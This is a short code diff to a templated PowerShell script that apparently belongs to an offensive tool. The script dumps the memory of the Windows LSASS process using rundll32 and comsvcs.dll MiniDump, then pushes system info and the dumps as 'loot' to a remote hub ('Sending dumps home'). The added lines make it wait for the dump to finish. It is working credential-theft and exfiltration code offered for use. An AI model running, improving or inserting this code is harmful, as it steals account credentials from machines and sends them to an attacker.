@@ -704,6 +704,8 @@ Partially based on:
 
         {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
         & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
+        Wait-Process -Id (Get-Process rundll32).id
+
         {{'Write-Debug "Dumping sysinfo..."'|debug}}
         $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
         {{'Write-Debug "Sending dumps home..."'|debug}}
